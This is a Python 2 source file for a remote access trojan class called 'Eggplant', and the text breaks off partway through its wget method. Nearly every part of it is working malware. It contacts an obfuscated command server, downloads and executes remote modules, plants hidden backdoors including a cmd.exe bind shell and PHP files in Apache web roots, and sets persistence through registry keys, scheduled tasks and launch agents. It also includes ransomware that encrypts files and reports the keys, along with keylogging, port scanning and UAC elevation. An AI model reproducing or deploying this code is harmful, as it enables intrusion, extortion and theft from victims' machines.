#!/usr/bin/python
# -*- coding: utf-8 -*-
import os
import sys
import socket
import subprocess
import pip.commands.install as pip
from imp import new_module
from base64 import b64encode, b64decode
from binascii import hexlify, unhexlify
from time import sleep
from requests import get, post
from uuid import uuid1

# encryption
try:
    from Crypto.Cipher import AES
    from Crypto.Hash import HMAC, SHA256
    from Crypto.Util.number import bytes_to_long, long_to_bytes
except: pass

# windows
try:
    if os.name is 'nt':
        from _winreg import HKEY_CURRENT_USER, KEY_WRITE, KEY_ALL_ACCESS, REG_SZ, CloseKey, DeleteValue, OpenKey, SetValueEx
        from ctypes import windll
        from win32com.shell.shell import ShellExecuteEx
except: pass


class Eggplant(object):
    """
    Mother of all Eggplants. Capable of birthing entire generations of eggplants
    """
    def __init__(self, *args, **kwargs):
        self.debug          = bool(kwargs.get('debug')) if 'debug' in kwargs else filterwarnings('ignore')
        self.connect_port   = int(kwargs.get('connect_port')) if kwargs.get('connect_port') else 1337
        self.logger_port    = int(kwargs.get('logger_port')) if kwargs.get('logger_port') else 9020
        self.listen_port    = int(kwargs.get('listen_port')) if kwargs.get('listener_port') else 7331
        self.backdoor_port  = int(kwargs.get('backdoor_port')) if kwargs.get('backdoor_port') else 2090
        self.urls           = dict({'gists':'https://api.github.com/gists','repo':'https://api.github.com/repos/colental/AngryEggplant/contents','raw':'https://raw.githubusercontent.com/colental/AngryEggplant/master/modules/%s','resources':'https://raw.githubusercontent.com/colental/AngryEggplant/master/resources/%s','services':'https://svnweb.freebsd.org/base/head/etc/services?revision=310355','imgur':'https://api.imgur.com/3/upload','adjectives':'https://raw.githubusercontent.com/janester/mad_libs/master/List%20of%20Adjectives.txt','nouns':'https://raw.githubusercontent.com/janester/mad_libs/master/List%20of%20Nouns.txt'})
        self.files          = dict(kwargs.get('files')) if kwargs.get('files') else dict({'cache':[]})
        self.persistence    = dict(kwargs.get('persistence')) if kwargs.get('persistence') else dict({'scheduled tasks':[], 'hidden files':[], 'registry keys':[]}) if os.name is 'nt' else dict({'launch agents':[], 'hidden files':[]})
        self.server         = dict(kwargs.get('server')) if kwargs.get('server') else dict({'url': 'MTI2OGE3NDQ3MDI3MDRlYTA3MTAzYjM3M2VhMjMzODMxNWJmM2FiMGMyM2Y4MDEyMjRjODBmYmVlZmY2NzFlNTQyNzc0NTgwNDZlMGE4MTkwYWIyY2EyY2ZlMzQ1ZWFlNjczMzE2OTcyN2M1YjZkZjZjYTIwNjIwZTYzYjgyNTcyNDg0YjM5ZTI3NjIxZGI3N2QyZDMyNGVjMTk4ZDYxZmYyYTMzNmU2NDU4NzBmY2I4ZTU2ZmRiNDY1YzA5MDcyMmYxYTI3NDYyMDQzNzhjMmQ1NDNmZjRjNWRkODEyYjE2ZTMyZmZiYzc3N2ZhNTYzMzY1NjdkYjcyYjk1ZGZiMWQ3ODc2NDQyMjY2Y2E3MzYwODY2ZTZiODc1MjdlZjk0ZGI4Y2IyZjY5NGQ2YTgzNDljNzIwOTlmNTY5ZWZjMDllOTkzNDMyZjRiNzZlNjc3YTkyZjAyNDgxZjM3YjMyYTY3ZmYwYzk0M2VjYWE3MjVmNTI3MGY5MWE5NDYzYjY5NTI0Y2Y3ZDBlZjViYTAwNzE3OWIyNjQyODY4NTdhYzVmZjUzZTQ3YThjMzdlZGYzYWZjNzU0NDVmOWYzNDAwNzQ1NDhjZDAyNTU1YWU0NzIwMjE0ODM5MzhlY2EzMzQ5N2VlNzBjNDRlYmI0OTM1NzM4NjMxOTVkY2Q0OTUzNTg0Nzg4ZTU5NWMxODMyZWRjZGFjNTNmOTA2OTVlYzE1MjA2MzMzMDc2YjEzMzQzOTMwNDIzNjY1MTIwNjMxNTg3NzdjNDdiMjZhM2UzZDRjNzUxOWNhYjEzMDFkYjljYzM3YzQ1OTcxZjM=', 'api': 'ODY0MTY1YTBlMTg0MzlhYmIyN2Q4NGE0YjM3MWNiZDZlYmFmNDUzOTE3Mjk3NTA=', 'key': 'ODE0OTc0YzRkNDI1ZTVlYTA0YTM1YzkzMDY5OTE2NDRiMWYwODk2OTYzYzZmYTg1ODEyNGMxMGRiMDc0MzU2NjE2MDQ4NjI3ZTRhNWMzZGRkNTI1Y2ZlNTYzNmEyZDAzMTU3NzcwMDVhMmQ3NTRlNTZhOTkyMGRkOWZjOWIyMDQ3ZGRkMGIwMGM0ZWU5NWVlOGM0ODY0ZDk3ZWIwODQ2ODA4MDQ3ZmQzZTAzMzE2ZDJmMzU1NTRjMjMyY2EyNTQ1NDNmOTYzZDc1ZTBhZDA2ZGU4MTMzNzY2MTdlNzZhNzQwYmE1ZDEwMDA1YmQ5YmQ2YTMwYWEwZWJiNWM3MTI0NjI0NWJlZTI5N2ZlNGMzODJjYWU5ZjQxYmJmMjVjNmRiMWNhY2IyYmVhNTJhNmY4YWI3MzQxZDcyMjUyOTM2ZTg5M2UyNmE5NzQ1OTQ4YmYzMzk1YTg2YTRlMTczMTM3ODk1OGY0ODkxMWUxYzc0OQ=='})
        self.open_ports     = dict(kwargs.get('port_scans')) if kwargs.get('port_scans') else dict({})
        self.backdoors      = dict(kwargs.get('backdoors')) if kwargs.get('backdoors') else dict({})
        self.local_network  = dict(kwargs.get('local_network')) if kwargs.get('local_network') else dict({})
        self.services       = dict({i.split()[1].split('/')[0]:[i.split()[0], ' '.join(i.split()[2:])] for i in get(self.urls.get('services')).text.encode().splitlines() if len(i.split())>1 if 'tcp' in i.split()[1]})
        self.crontab        = dict({'Crontab':'/etc/cron.d', 'User Crontab':'/var/spool/cron'}) if (sys.platform.startswith('linux') or sys.platform.endswith('nix')) else None
        self.fname          = bytes(os.path.splitext(os.path.basename(sys.argv[0]))[0])
        self.ip             = bytes(socket.gethostbyname(socket.gethostname()))
        self.external_ip    = bytes(get('http://api.ipify.org').text.encode())
        self.localhost      = bytes(socket.gethostbyname(socket.gethostname()))
        self.login          = bytes(os.environ.get("USERNAME", failobj="Unknown"))
        self.machine        = bytes(os.environ.get("COMPUTERNAME", failobj="Unknown"))
        self.platform       = bytes(sys.platform) if 'darwin' not in sys.platform else 'macOS'
        self.cwd            = bytes(kwargs.get('cwd')) if kwargs.get('cwd') else bytes(os.getcwd())
        self.mac            = bytes('-'.join(uuid1().hex[20:][i:i+2] for i in range(0,11,2)).upper())
        self.pstring        = bytes('ping -n 1 -w 90 {}') if os.name is 'nt' else bytes('ping -c 1 -w 90 {}')
        self.device         = bytes(os.popen('uname -a').read()) if not os.name is 'nt' else bytes('Microsoft Windows {}'.format(' '.join([i.partition(':')[2].strip() for i in os.popen('GPRESULT /R').read().splitlines() if 'OS Version' in i or 'Domain' in i])))
        self.links          = ['linux_payload.txt', 'osx_payload.sh', 'windows_payload.exe', 'icon.icns', 'icon.png', 'icon.ico', 'Info.plist', 'keylogger.py', 'screenshot.py', 'osx_make_app.py']
        self.socket         = self._connect() if 'socket' not in kwargs else kwargs.get('socket')
        self.dhkey          = self._diffiehellman() if 'dhkey' not in kwargs else kwargs.get('dhkey')
        self.admin          = lambda: bool(windll.shell32.IsUserAnAdmin() == 0) if os.name is 'nt' else bool(os.getuid() == 0)
        self.identity       = lambda: "\n\tHost Machine Information\n" + "\n".join(["{} : {}".format(i[0],i[1]) for i in [('Platform',self.platform), ('IP',self.ip), ('Machine',self.machine), ('Login',self.login), ('Admin',self.admin), ('Files',self.files)] if i[1]])
        self.register       = lambda: dict({'uid':self.mac, 'platform':self.platform, 'ip':self.ip, 'machine':self.machine, 'login':self.login, 'admin':self.admin, 'fpath':self.backdoors, 'hidden_files':self.persistence.get('hidden files'), 'registry_keys':self.persistence.get('registry keys'), 'scheduled_tasks':self.persistence.get('scheduled tasks')}) if os.name is 'nt' else lambda:dict({'uid':self.mac, 'platform':self.platform, 'ip':self.ip, 'machine':self.machine, 'login':self.login, 'admin':self.admin, 'fpath':self.backdoors, 'hidden_files':self.persistence.get('hidden files'), 'launch_agents':self.persistence.get('launch agents')})
        self.get_modules    = lambda: [create_module(b64decode(get(i['git_url']).json()['content']), i['name']) for i in get(self._deobfuscate('YjY2ODk3OTQ1ODQ3MTQ4OGQ3ODAyMjU3NDhjNzEzYzMwNTc0NWFjMmIyZWY1NjMyYWUxZGVmNmI0ZDA2NDEwZTcxOTdkNTAwOTYyNmViODk2MTgyZDMzOWFlMjE1NDhhZTYzYTU3YjZhZGU5YzcyNzE0NjE0YTU2ODUyYmRlYjYwMDk4NGI5N2Q3MTVkZDNlNWI5N2I2OTI1YjViYjIwODVhYWUxZTA2ODAxZTczYWI3MjQ2NmZiOTE5Mjk4ODk2NWQ0NWUyMGYyYjBhMjhlNmQxYzcxYThjNDU5OTNkMTJiMjk2MjU1ZTU3ZWNlNjgwZDZlNzFkMjUyZWFmMTdiODY3Nzc3ZTYzNjEwMzEyNmZiNzJiYjY2MDYzNDZiYzcyOTIzM2FmZTljN2NkOTEyNDg1MjYwYzNjNzY0YWQ1YjcyMDIxNmVhYzk4OTY1Y2Q1N2UwZWE2ODQwYWQ3YTQxZDA2YjliODUxM2Q1OGViOTY2YzFiNmNhOTVlMjI4NzVmNDQzMDE0NzA1NTg0NTE4NWU2YWI4YzYxYWU4ODQ3YTFjM2U2NTc1MTUxMWJiYjQ3MjJiYWQ2NDdlZDA5NWIwYjM0YTNlYzlhMDUxZTA2ZTc4M2Q2MzMyODIzMzJlMjk3YTYwNTA0NDcyMjkwMzljODgzOTY0NTdjMjU1OTc2NGJlNDAwMThkNDAxNzZkMTIyNDMxZGM4MmJjMjM5ZGViM2QxMzdlYmFjOWU4MDE0ZDcyOWMyMTg2YmFmNDY2MjEyMjNlNzQ3NzdjOWI2YTI0MGRmYWViMTI2YWViMjQzMTdhMWJjZDQwM2I2ODViODNhMDgyM2M1ZTYyN2QwNmQ1YjhlODc3YWE0NDFhOTk3OWVhMGIzZA==')).json()]
        self.commands       = { 'ls'            :   self.ls,
                                'cat'           :   self.cat,
                                'pwd'           :   self.pwd,
                                'uac'           :   self.uac,
                                'wget'          :   self.wget,
                                'kill'          :   self.kill,
                                'admin'         :   self.admin,
                                'unzip'         :   self.unzip,
                                'ransom'        :   self.ransom,
                                'standby'       :   self.standby,
                                'restart'       :   self.restart,
                                'info'          :   self.identity,
                                'selfdestruct'  :   self.destruct,
                                'register'      :   self.register,
                                'uid'           :   self.mac_address,
                                'mac'           :   self.mac_address
                                }
        self.modules        = { 'backdoor'      :   self.backdoor,
				'portscan'	:   self.portscan,
                                'keylogger'     :   self.keylogger,
                                'screenshot'    :   self.screenshot,
                                'lan'           :   self.network_scan,
                                'encrypt'       :   self.encrypt_file,
                                'decrypt'       :   self.decrypt_file,
                                'persistence'   :   self.run_persistence
                                }
        
    def _tempdir(self):
        try:
            if os.name is 'nt':
                for tmp in ["%TEMP%", "%TEMPDIR%", "%TMP%"]:
                    tmpdir = os.path.expandvars(tmp)
                    if tmpdir != tmp:
                        return tmpdir
            else:
                for tmp in ["/tmp", "/var/tmp"]:
                    if os.path.isdir(tmp):
                        return tmp
            return os.getcwd()
        except Exception as e:
            if self.debug:
                 print 'Temporary directory returned error: {}'.format(str(e))
            sys.exit(0)

    def _tempfile(base=None, extension=''):
        return os.path.join(self._tempdir(), base + extension) if base else os.path.join(self._tempdir(), 'tmp_' + self._rand(3) + extension)
            
    def _rand(self, e=1):
        return str().join([list([chr(i) for i in range(48,58)] + [chr(i) for i in range(65,91)] + [chr(i) for i in range(97,123)])[int([n for n in [ord(os.urandom(1)) for i in xrange(100)] if n < len(list([chr(i) for i in range(48,58)] + [chr(i) for i in range(65,91)] + [chr(i) for i in range(97,123)]))][0])] for _ in range(e)])

    def _pad(self, data):
        return data + b'\0' * (AES.block_size - len(data) % AES.block_size)

    def _choice(self, item):
        return item[int([n for n in [ord(os.urandom(1)) for i in xrange(1000)] if n < len(item)][0])]

    def _connect(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setblocking(True)
        try:
            info = get(self._deobfuscate(self.server.get('url')), headers={self._deobfuscate(self.server.get('api')) : self._deobfuscate(self.server.get('key'))}).json()
            addr = (info.get(info.keys()[0])[0].get('ip').encode(), self.connect_port)
            s.connect(addr)
            self.socket = s
            return s
        except Exception as e:
            if self.debug:
                print "Connection error: {}".format(str(e))
            sleep(10)
            execfile(sys.argv[0])
            sys.exit(0)

    def _send(self, data, method='default'):
        try:
            block = data[:4096]
            data  = data[len(block):]
            ciphertext  = self._encrypt(block)
            msg = '{}:{}\n'.format(method, ciphertext)
            self.socket.sendall(msg)
            if len(data):
                return self._send(data, method)
        except Exception as e:
            if self.debug:
                print "Send data returned error: {}".format(str(e))
        
    def _diffiehellman(self, bits=2048):
        try:
            p = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
            g = 2
            a = bytes_to_long(os.urandom(32)) 
            xA = pow(g, a, p)
            self.socket.send(long_to_bytes(xA))
            xB = bytes_to_long(self.socket.recv(256))
            x = pow(xB, a, p)
            return SHA256.new(long_to_bytes(x)).digest()
        except Exception as e:
            if self.debug:
                print "Diffie-Hellman error: {}".format(str(e))
            sleep(10)
            execfile(sys.argv[0])
            sys.exit(0)

    def _encrypt(self, plaintext):
        try:
            text = self._pad(plaintext)
            iv = os.urandom(AES.block_size)
            cipher = AES.new(self.dhkey[:16], AES.MODE_CBC, iv)
            ciphertext = iv + cipher.encrypt(text)
            hmac_sha256 = HMAC.new(self.dhkey[16:], msg=ciphertext, digestmod=SHA256).digest()
            output = b64encode(ciphertext + hmac_sha256)
            if self.debug:
                print output
            return output
        except Exception as e:
            if self.debug:
                print "Encryption error: {}".format(str(e))

    def _decrypt(self, ciphertext):
        try:
            ciphertext  = b64decode(ciphertext)
            iv          = ciphertext[:AES.block_size]
            cipher      = AES.new(self.dhkey[:16], AES.MODE_CBC, iv)
            check_hmac  = ciphertext[-SHA256.digest_size:]
            calc_hmac   = HMAC.new(self.dhkey[16:], msg=ciphertext[:-SHA256.digest_size], digestmod=SHA256).digest()
            output      = cipher.decrypt(ciphertext[len(iv):-SHA256.digest_size])
            if self.debug:
                print output.rstrip(b'\0')
                if check_hmac != calc_hmac:
                    print str("Sent HMAC-SHA256 Hash: {}".format(hexlify(check_hmac)) + "\nCalc HMAC-SHA256 Hash: {}".format(hexlify(calc_hmac)))
            return output.rstrip(b'\0')
        except Exception as e:
            if self.debug:
                print "Decryption error: {}".format(str(e))

    def _obfuscate(self, data):
        data    = hexlify(data)
        p       = []
        block   = self._rand(2)
        for i in xrange(2, 10000):
            is_mul = False
            for j in p:
                if i % j == 0:
                    is_mul = True
                    block += self._rand()
                    break
            if not is_mul:
                if len(data):
                    p.append(i)
                    block += data[0]
                    data = data[1:]
                else:
                    return b64encode(block)

    def _deobfuscate(self, block):
        p = []
        block = b64decode(block)
        for i in range(2, len(block)):
            is_mul = False
            for j in p:
                if i % j == 0:
                    is_mul = True
                    break
            if not is_mul:
                p.append(i)
        return unhexlify(str().join(block[n] for n in p)) 

    def _backdoor(self, **kwargs):
        if sys.platform in ('darwin','ios'):
            if 'osx_make_app' not in globals():
                try:
                    osx_app_file = self.wget(os.path.join(self.urls['raw'], 'osx_make_app.py'))
                    
                    with open(osx_app_file, 'r') as fp:
                        osx_app  = fp.read()
                        
                    osx_make_app = create_module(osx_app, 'osx_make_app')
                except Exception as osxe:
                    return "Mac OS X make app bundle download error: {}".format(str(osxe))
            try:
                appname      = os.path.splitext(os.path.basename(sys.argv[0]))[0]
                iconfile     = self.wget(os.path.join(self.urls['resources'], 'icon.icns'), path=icon_path)
                payload_file = self.wget(os.path.join(self.urls['raw'], 'osx_backdoor.py'))
                
                with file(payload_file, 'r') as fr:
                    payload = fr.read()

                osx_payload  = payload.replace('__HOST__', self.ip).replace('__PORT__', self.backdoor_port).replace('__APPNAME__',appname)
                try:
                    app_bundle = globals()['osx_make_app'].main(osx_payload, icon=iconfile, version='27.0.0.170')
                except Exception as u:
                    return "Mac OS X make app bundle runtime error: {}".format(str(u))
                os.chmod(payload_path, 0755)
                self.backdoors.update({'app':str(os.getcwd() + os.sep + appname + '.app'), 'launch agent':str('~/Library/LaunchAgents/com.apple.'+appname)})
                return '\nBackdoor app:\t{}\nLaunch agent:\t{}\n'.format(str(os.getcwd() + os.sep + appname + '.app'), str('~Library/LaunchAgents/com.apple.' + appname))
            except Exception as x1:
                return 'Mac OS X backdoor module failed with error: %s' % str(x1)
            
        elif os.name is 'nt':
            try:
                bd = self.wget(os.path.join(self.urls['raw'], 'windows/windows_payload.exe'), path='MicrosoftUpdateManager')
                _ = os.popen('attrib +h {}'.format(bd)).read()
                self.persistence.get('hidden files').append(bd)
                if os.path.isfile(bd):
                    self.backdoors['sbd'] = bd
                    __ = os.popen('start /b /d %s %s -l -p 4433 -c on -q -D on -e cmd.exe' % (os.path.dirname(bd), os.path.basename(bd))).read()
                    try:
                        tn  = kwargs.get('appname') if 'appname' in kwargs else os.path.join('Adobe')
                        ___ = os.popen('schtasks /create /tn {} /tr {} /sc hourly'.format(tn, bd)).read()
                        self.persistence.get('scheduled tasks').append(tn)
                    except: pass
                    return 'Success - backdoor listening on {} at port {}'.format(str(self.ip), str(self.backdoor_port))
                else:
                    return 'Failed to download backdoor'
            except Exception as ee:
                if self.debug:
                    print 'Windows backdoor failed with error: {}'.format(str(ee))

        elif 'posix' in os.name:
            try:
                result = []
                if not self.backdoors.has_key('apache'):
                    self.backdoors.update({'apache':[]})
                if subprocess.call('service --status-all | grep apache2',0,None,None,subprocess.PIPE,subprocess.PIPE,shell=True) == 0 and os.path.isdir('/var/www/html'):
                    php = self.wget(os.path.join(self.urls['raw'], 'linux_payload.txt'), path='/var/www/html/.apache.php')
                    self.backdoors.get('apache').append(path)
                    result.append("Embedded backdoor in the Apache web server root directory: '" + path + "'")
                    items = [i for i in os.listdir('/var/www/html') if os.path.isdir(i)]
                    for doc in items: 
                        np = os.path.join(os.path.abspath(doc), '.apache.php')
                        payload = self.wget(os.path.join(self.urls['raw'], 'linux_payload.txt', path=np))
                        result.append("Embedded backdoor in a website document root as: " + np)
                        self.backdoors.get('apache').append(np)
                    if subprocess.call('service apache2 start',0,None,None,subprocess.PIPE,subprocess.PIPE,shell=True) == 0:
                        result.append("Apache webserver now running on client host machine...")
                    return "\n".join(result)
            except Exception as bderr:
                if self.debug:
                    print "\n{} backdoor failed with error: {}".format(str(os.environ.get('OS')).capitalize(), str(bderr))
                return "\n{} backdoor failed with error: {}".format(str(os.environ.get('OS')).capitalize(), str(bderr))
        

    def _ransom_update(self, filename):
        try:
            stmt = "INSERT INTO filesystems (ip, mac, filename, keyvalue) VALUES ('{}','{}','{}','{}')".format(self.ip, self.mac, os.path.abspath(filename), self.dhkey)
            self._send(stmt, method='query')
        except Exception as e:
            return "Ransom database update error: {}".format(str(e))

    def _ransom(self, arg, dirname, fnames):
        errors = [e for e in map(self._ransom_update, [x for x in map(self.encrypt_file, [os.path.join(dirname, i) for i in fnames]) if x]) if e]
        if errors:
            if self.debug:
                print "Warning: worker returned the following error(s):\n{}".format("\n".join(errors))

    def _purge_regkeys(key_name):
        all_keys = self.persistence.get('registry keys').keys()
        for key in all_keys:
            value = self.persistence.get('registry keys').get(key).get('value')
            run_key = self.persistence.get('registry keys').get(key).get('key')
            try:
                reg_key = OpenKey(HKEY_CURRENT_USER, run_key, 0, KEY_ALL_ACCESS)
                DeleteValue(reg_key, value)
                CloseKey(reg_key)
            except Exception as e:
                if self.debug:
                    print "Destruct error: {}".format(str(e))

    def _identity(self):
        return self.identity()
    
    def _ping(self, host, *args):
        try:
            if subprocess.call(self.pstring.format(host), shell=True) == 0:
                return host
        except: pass

    def _portscan(self, ip):
        try:
            socket.inet_aton(ip)
        except socket.error:
            return 'Error: Invalid IP address.'

        results = [ip, '\t{:>5}\t{:>4}\t{:<20}'.format('Port','State','Service')]

        for p in [21, 22, 23, 25, 53,
                  80, 110, 111, 135, 139,
                  143, 179, 443, 445, 514,
                  993, 995, 1723, 3306, 3389,
                  5900, 8000, 8080, 8443, 8888]:

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            c = s.connect_ex((ip, p))
            socket.setdefaulttimeout(0.5)
            if not c:
                state   = 'open'
                service = ' '.join(self.services.get(str(p))).title()
                results.append('\t{:>5}\t{:>4}\t{:<20}'.format(p, state, service))

        return '\n'.join(results)
    
    def _unschedule_tasks(self):
        all_tasks = self.persistence.get('scheduled tasks')
        for task in all_tasks:
            try:
                delete = subprocess.Popen('schtasks /delete /tn %s /f' % task,0,None,subprocess.PIPE,subprocess.PIPE,subprocess.PIPE,shell=True)
                output,error = delete.communicate()
                if 'SUCCESS' not in output:
                    if self.debug:
                        print "Delete scheduled task failed to remove task with name: {}".format(task)
            except Exception as e:
                if self.debug:
                    print "Destruct error: {}".format(str(e))

    def _remove_backdoors(self):
        for bd in self.backdoors: 
            if os.path.isfile(bd):
                try:
                    os.remove(bd)
                except Exception as t:
                    if self.debug:
                        print "Remove backdoor returned error: {}".format(str(t))

            elif os.path.isdir(bd):
                if not os.name=='nt':
                    try:
                        r = subprocess.check_output('rm -rf %s' % bd,shell=True)
                    except Exception as er:
                        if self.debug:
                            print "Remove backdoor returned error: {}".format(str(er))
                else:
                    try:
                        r = subprocess.Popen('rmdir /s /q %s' % bd,0,None,subprocess.PIPE,subprocess.PIPE,subprocess.PIPE,shell=True)
                    except Exception as p:
                        if self.debug:
                            print "Remove backdoor returned error: {}".format(str(p))

    def run_persistence(self, **kwargs):
        if os.name is 'nt':
            try:
                fpath = sys.argv[0]
                interval = 'hourly'
                try:
                    run_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
                    key_val = sys.argv[0]
                    key_id  = self.fname
                    reg_key = OpenKey(HKEY_CURRENT_USER, run_key, 0, KEY_WRITE)
                    SetValueEx(reg_key, key_id, 0, REG_SZ, key_val)
                    CloseKey(reg_key)
                    self.persistence.get('registry keys').append("Registry Key: %s\nKey Value: %s" % (run_key, key_val))
                except: pass
                try:
                    direct = os.popen('attrib +h {}'.format(sys.argv[0])).read()
                    self.persistence.get('hidden files').append(sys.argv[0])
                except: pass
                try:
                    schtask = subprocess.Popen('schtasks /create /tn {} /tr {} /sc {} /f'.format(self.fname, sys.argv[0], interval), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True)
                    out,err = schtask.communicate()
                    self.persistence.get('scheduled tasks').append(self.fname)
                except: pass
            except Exception as w:
                if self.debug:
                    print "Persistence error: {}".format(str(w))
            result = "\n\n" + "\n\n".join(["{} : {}".format(str(i).title(), str(self.persistence.get(i))) for i in self.persistence.keys()]) + "\n\n"

        elif sys.platform in ('darwin','ios'):
            try:
                filename = os.path.basename(sys.argv[0])
                if not filename.startswith('.'):
                    hidden = '.' + filename
                    os.rename(sys.argv[0], hidden)
                    self.persistence.get('hidden files').append(hidden)
            except:
                pass

            try:
                osx_paths = ['var','tmp','lib','local','cache']
                osx_files = ['.local','.cache','.fsevents','.V100_Spotlight','.bash_profile']
                fpath = os.path.join(self._choice(osx_paths), self._choice(osx_files))
                os.makedirs(fpath) if not os.path.isdir(fpath) else None
            except:
                fpath = os.path.join(os.environ.get('TEMP', failobj=os.getcwd()), self._choice(osx_files))
            try:
                plist       = get(os.path.join(self.urls['raw'], 'Info.plist')).text.encode()
                label       = self._choice(['updates','cache','itunes','spotlight','archives'])
                infoPlist   = plist.replace('__LABEL__',label).replace('__SELF__', sys.argv[0])

                with file(fpath, 'w') as fp:
                    fp.write(infoPlist)

                self.persistence.get('hidden files').append(fpath)
                os.chmod(fpath, 0755)
                self.persistence.get('launch agents').append('~/Library/LaunchAgents/'+ label + '.plist')
                os.startfile(fpath)
            except:
                pass

            result = "\n".join(["{} : {}".format(str(i).title(), str(self.persistence.get(i))) for i in self.persistence.iterkeys()])
        else:
            result = "\nPersistence not yet available for " + self.platform + "\n"

        return result

    def unzip(f):
        if os.path.isfile(f):
            try:
                with zipfile.ZipFile(f) as zf:
                    zf.extractall('.')
                    return 'File {} extracted.'.format(f)
            except zipfile.BadZipfile:
                return 'Error: Failed to unzip file.'
        else:
            return 'Error: File not found.'

    def mac_address(self):
        return self.mac

    def kill(self, sock=None):
        try:
            if not sock:
                sock = self.socket
            try:
                sock.shutdown(socket.SHUT_RDWR)
            except:
                pass
            try:
                sock.close()
            except:
                pass
        except Exception as e:
            if self.debug:
                print "Kill client failed with error: {}".format(str(e))

    def portscan(self, host=None):
        if not host:
            host = self.ip
        return self._portscan(host)

    def store_result(self, filename):
        try:
            description = self._choice(self.adjectives).title() + self._choice(self.nouns).title()
            if self.debug:
                print 'Posting results as anonymous gist with description %s' % description
            do = post('https://api.github.com/gists', headers={"description":description,"public":"true","files":{filename:{"content":open(filename.read())}}})
        except: pass
                
    def run_module(self, cmd, action=None):
        try:
            if cmd in self.commands:
                result = self.commands[cmd](action) if action else self.commands[cmd]()
            elif cmd in globals():
                result = globals()[cmd](action) if action else globals()[cmd]()
            else:
                try:
                    url = self.urls.get('raw') % str(cmd)
                    code = get(url).text.encode()
                    _ = create_module(code, str(cmd))
                    result = run_module(cmd, action) if action else run_command(cmd)
                except Exception as e3:
                    result = "Command didn't match any current modules.\nAttempted to download module from the repository ['%s'].\nDownload failed with error: %s" % (str(url), str(e3))
            return result
        except Exception as e:
            return "Run %s returned error: %s" % (str(cmd), str(e))

    def uac(self):
        try:
            ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters='{} asadmin'.format(sys.argv[0]))
            sys.exit(0)
        except Exception as e:
            if self.debug:
                print "UAC error: {}".format(str(e))
            return True

    def ransom(self, path):
        if os.path.isfile(path):
            _ = self.encrypt_file(path)
        elif os.path.isdir(path):
            try:
                os.path.walk(path, self._ransom, None)
            except Exception as e:
                if self.debug:
                    print "Ransom error: {}".format(str(e))
                return "Ransom error: {}".format(str(e))
        return "Successfully encrypted '{}'".format(path)

    def encrypt_file(self, filename):
        if os.path.isfile(filename):
            try:
                with file(filename, 'r') as fp:
                    data = fp.read()
                with file(filename, 'w') as fc:
                    fc.write(self._encrypt(data))
                return filename
            except Exception as e:
                if self.debug:
                    print "File encryption returned an error: {}".format(str(e))
            
    def decrypt_file(self, filename):
        if os.path.isfile(filename):        
            try:
                with file(filename, 'r') as fp:
                    data = fp.read()
                with file(filename, 'w') as fc:
                    fc.write(self._decrypt(data))
                return filename
            except Exception as e:
                if self.debug:
                    print "File decryption returned an error: {}".format(str(e))

    def cd(self, path):
        try:
            os.chdir(path)
            return 'Current directory: {}'.format(os.getcwd())
        except Exception as e:
            return 'Change directory returned error: {}'.format(str(e))
        
    def cat(self, filepath):
        if os.path.isfile(filepath):
            try:
                with open(filepath) as f:
                    return f.read(4000)
            except IOError:
                return 'Error: Permission denied.'
        else:
            return 'Error: File not found.'

    def ls(self, path='.'):
        if os.path.exists(path):
            try:
                return '\n'.join(os.listdir(path))
            except OSError:
                return 'Error: Permission denied.'
        else:
            return 'Error: Path not found.'

    def pwd(self):
        return os.getcwd()

    def destruct(self):
        try:
            for bd in self.backdoors:
                try:
                    self._remove_backdoors()
                except Exception as z:
                    if self.debug:
                        print "Backdoor-destruct error: {}".format(str(z))
                        
            for k in self.files.keys():
                for f in self.files.get(k):
                    if os.path.isfile(f):
                        try:
                            os.remove(f)
                        except Exception as e:
                            if self.debug:
                                print "File-destruct error: {}".format(str(e))

            for h in self.persistence.get('hidden files'):
                try:
                    os.remove(h)
                except Exception as c:
                    if self.debug:
                        print "Hidden file destruct error: {}".format(str(c))

            if os.name is 'nt':
                try:
                    self._purge_regkeys()
                except Exception as v:
                    if self.debug:
                        print "Registry key destruct error: {}".format(str(v))

            if os.name is 'nt':
                try:
                    self._unschedule_tasks()
                except Exception as sc:
                    if self.debug:
                        print "Schedule tasks destruct error: {}".format(str(sc))

            if sys.platform in ('darwin','ios'):
                for agent in self.persistence.get('launch agents'):
                    try:
                        os.remove(agent)
                    except Exception as xc:
                        if self.debug:
                            print "Launch agent destruct error: {}".format(str(x))

            for i in self.files.get('cache'):
                if os.path.isfile(i):
                    try:
                        os.remove(i)
                    except Exception as t:
                        if self.debug:
                            print "Cache file destruct error: {}".format(str(t))        

                elif os.path.isdir(i):
                    if not os.name is 'nt':
                        try:
                            r = subprocess.check_output(['rm','-rf',i],shell=True)
                        except Exception as er:
                            if self.debug:
                                print "Posix directory tree directory destruct error: {}".format(str(er))
                    else:
                        try:
                            r = subprocess.Popen(['rmdir','/s','/q',i],0,None,subprocess.PIPE,subprocess.PIPE,subprocess.PIPE,shell=True)
                        except Exception as p:
                            if self.debug:
                                print "Windows directory tree destruct error: {}".format(str(p))
                try:
                    self._kill()
                except Exception as p:
                    if self.debug:
                        print "Connection shutdown returned error: {}".format(str(p))
                try:
                    os.remove(sys.argv[0])
                except Exception as p:
                    if self.debug:
                        print "Self-destruct error: {}".format(str(p))
        finally:
            exit()

    def network_scan(self, target=None):
        if not target:
            target = self.ip
            result = {}
        else:
            result = self.local_network
        
        subnet = filter(self._ping, ['.'.join(target.split('.')[:-1]) + '.' + str(i) for i in range(1,255)])
        
        for ip in subnet:
            result[ip] = self.portscan(ip)           

        return '\n'.join([result.get(host)for host in result])
            


    def wget(self, url, base=None):
